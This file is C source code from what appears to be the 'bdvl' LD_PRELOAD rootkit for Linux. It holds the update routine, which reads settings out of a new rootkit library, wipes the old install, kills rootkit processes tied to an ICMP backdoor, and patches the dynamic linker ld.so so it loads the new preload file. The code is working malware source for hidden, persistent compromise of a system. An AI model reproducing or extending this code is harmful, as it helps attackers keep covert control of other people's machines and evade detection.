/* resolves the imgay function in the target bdvl.so.
 * once resolved, the function is called. output from the
 * function call is then stored accordingly in the
 * array allocated at the very beginning. */
char **bdvsearch(const char *sopath){
    char **ret = malloc(sizeof(char*)*4);
    if(!ret) return NULL;

    void **handle=NULL, (*ptr)();
    int filedes[2], i=0;
    pid_t pid;
    char buffer[2048], *bufdup, *buftok, *tokdup, *p;
    ssize_t count;
    size_t cfgsize;

    if(pipe(filedes) < 0){
        free(ret);
        return NULL;
    }

    pid = fork();
    if(pid < 0){
        free(ret);
        return NULL;
    }else if(pid == 0){
        while(dup2(filedes[1], STDOUT_FILENO) < 0 && errno == EINTR);
        close(filedes[1]);
        close(filedes[0]);
        ptr = getfuncptr(sopath, "imgay", handle);
        ptr();
        exit(0);
    }
    close(filedes[1]);
    dlclose(&handle);

    hook(CREAD);
    usleep(30000);
    count = (ssize_t)call(CREAD, filedes[0], buffer, sizeof(buffer)-1);
    close(filedes[0]);
    wait(NULL);

    if(!count){
        free(ret);
        return NULL;
    }

    bufdup = strdup(buffer);
    buftok = strtok(buffer, "\n");
    while(buftok != NULL && i<4){
        tokdup = strdup(buftok);
        p = strchr(tokdup, ':')+1;

        cfgsize = strlen(p)+1;
        ret[i] = malloc(cfgsize);
        if(!ret[i]){
            free(ret);
            ret = NULL;
            goto nopenope;
        }
        memset(ret[i], 0, cfgsize);
        strncpy(ret[i++], p, cfgsize);
        free(tokdup);

        buftok = strtok(NULL, "\n");
    }
nopenope:
    free(bufdup);
    return ret;
}

/* uninstall current installation. install target installation.
 *
 * this function is similar to bdvuninstall however there are a few minor differences.
 *   1. ld.so is not reverted, it is patched again to read from the new PRELOAD_FILE. (or OLD_PRELOAD if PATCH_DYNAMIC_LINKER is not defined in the target)
 *   2. HOMEDIR is not removed until the end if calling process (you) are in it installing bdvl.
 *   3. and of course..we reinstall with our new version at the very end.  */
void bdvupdate(char *const argv[]){
    char *aso=NULL, **values, *cwd, *curpreload;
    char *bdvlso, *installdir, *preloadpath;
    int inhome=0, i;
    gid_t magicgid;

    /* first make sure there is a valid target bdvl.so in argv. */
    for(i=2; argv[i] != NULL; i++) strstr(argv[i], ".so.") ? aso=argv[i] : NULL;
    if(aso == NULL){
        printf("No target .so(s)\n");
        return;
    }

    /* let's go! */
    printf("\n\e[1mAbout to begin update!\e[0m\n");
    printf("  Everything from this current installation will be removed.\n");
    printf("  So make sure you've saved stuff you wanna see again.\n");
    printf("Press enter to continue, ^C to cancel.\n");
    getchar();

    /* read important settings from target bdvl.so */
    values = bdvsearch(aso);
    if(!values){
        printf("Failed finding settings.\n");
        return;
    }
    installdir = values[0], preloadpath = values[1],
    bdvlso     = values[2], magicgid    = (gid_t)atoi(values[3]);

    /* uninstall current bdvl */
    printf("\nRemoving previous installation...\n");
#ifdef USE_ICMP_BD
    if(pdoorup())
        killrkprocs(readgid()-1);
#endif
    eradicatedir(INSTALL_DIR);

    if((cwd = getcwd(NULL, 0)) != NULL){   // installing new bdvl from homedir?
        if(strncmp(HOMEDIR, cwd, strlen(HOMEDIR)))
            eradicatedir(HOMEDIR);
        else inhome=1;
        free(cwd);
    }else eradicatedir(HOMEDIR); // just eradicate it now i guess

    printf("Removing bdvl paths\n");
    rmbdvpaths();

    curpreload = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    curpreload = PRELOAD_FILE;
#endif
    printf("Patching ld.so\n");
    ldpatch(curpreload, preloadpath);

    /* now install new bdvl. */
    bdvinstall(argv, installdir, bdvlso, preloadpath, magicgid);
    for(int i=0; i<4; i++){
        free(values[i]);
        values[i] = NULL;
    }
    free(values);

    // now we can eradicate...
    if(inhome) eradicatedir(HOMEDIR);
    printf("DONE! RECONNECT!!\n");

    hook(CKILL);
    call(CKILL, getppid(), SIGKILL);
    call(CKILL, getpid(), SIGKILL);
}